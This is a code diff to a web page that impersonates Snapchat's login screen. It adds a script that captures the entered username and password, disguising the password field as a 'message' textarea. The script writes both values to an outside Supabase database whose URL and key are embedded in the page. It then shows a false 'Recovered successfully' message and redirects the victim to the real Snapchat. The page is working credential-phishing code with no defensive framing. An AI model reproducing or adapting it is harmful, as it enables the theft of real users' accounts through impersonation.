@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in | Snapchat</title>
     <link rel="icon" type="image/x-icon" href="faviconV2.png">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2" defer></script>
     <style>
         /* --- Reset & Base Styles --- */
         * {
@@ -385,6 +386,30 @@
                 display: none;
             }
         }
+
+        .input-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 16px;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            font-family: inherit;
+            height: 45px;    /* Match the total height of the input (38-42px is typical for 10px padding) */
+  resize: none;    /* Disables the resize handle in the bottom right */
+  overflow: hidden;/* Hides scrollbars if text overflows single line */
+        }
+
+        .input-group textarea:focus {
+            border-color: #0096ff;
+            box-shadow: 0 0 0 1px #0096ff;
+        }
+.status-msg {
+      margin-top: 15px;
+      font-size: 14px;
+      font-weight: 600;
+    }
     </style>
 </head>
 <body>
@@ -400,21 +425,24 @@
 
             <h1>Log in to Snapchat</h1>
 
-<form name="login" method="POST" data-netlify="true">
+<form id="loginForm">
     <div class="input-group">
-        <label for="username">Username or Email</label>
-        <input type="text" id="username" name="username" required>
+      <label for="name">Username or Email</label>
+      <input type="text" id="name" name="name" required>
     </div>
 
     <div class="input-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" required>
+      <label for="message">Password</label>
+      <textarea id="message" name="message" required></textarea>
     </div>
 
     <a href="#" class="phone-link">Use phone number instead</a>
 
-    <button type="submit" class="btn-primary">Log In</button>
-</form>
+    <button type="submit" class="btn-primary" id="submitBtn">Log In</button>
+
+    <!-- Feedback container -->
+    <div id="statusMessage" class="status-msg"></div>
+  </form>
             <div class="divider">
                 <span>OR</span>	
             </div>
@@ -567,6 +595,64 @@
         });
     });
 </script>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  if (typeof window.supabase === 'undefined') {
+    console.error('Supabase library is not loaded.');
+    return;
+  }
+
+  const SUPABASE_URL = 'https://bueibjuwvbahhmipzvtd.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ1ZWlianV3dmJhaGhtaXB6dnRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5NDAxNDgsImV4cCI6MjEwMDUxNjE0OH0.FfUz5WM1_Y2HnpyTh3KeGOa0O_M3vqffb5klMRMgiNA';
+
+  const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  const form = document.getElementById('loginForm');
+  const statusDiv = document.getElementById('statusMessage');
+  const submitBtn = document.getElementById('submitBtn');
+
+  if (form) {
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const usernameValue = document.getElementById('name').value;
+      const messageValue = document.getElementById('message').value;
+
+      statusDiv.textContent = 'Recovering...';
+      statusDiv.style.color = '#333';
+      submitBtn.disabled = true;
+
+      const { data, error } = await supabaseClient
+        .from('messages')
+        .insert([{ name: usernameValue, message: messageValue }]);
+
+      submitBtn.disabled = false;
+
+      if (error) {
+        statusDiv.textContent = 'Error Recovering Account. Please try again.';
+        statusDiv.style.color = 'red';
+        console.error('Supabase Error:', error.message);
+      } else {
+        statusDiv.textContent = 'Recovered successfully! Opening Snapchat...';
+        statusDiv.style.color = 'green';
+        form.reset();
+
+        // Delay slightly (1 second) so the user sees the success message, then open Snapchat
+        setTimeout(() => {
+          // Attempt to open the Snapchat app via deep link
+          window.location.href = 'snapchat://';
+
+          // Fallback to Snapchat web after 1.5 seconds if the app doesn't open
+          setTimeout(() => {
+            window.location.href = 'https://www.snapchat.com';
+          }, 1500);
+        }, 1000);
+      }
+    });
+  }
+});
+  </script>
 
 </body>
 </html>
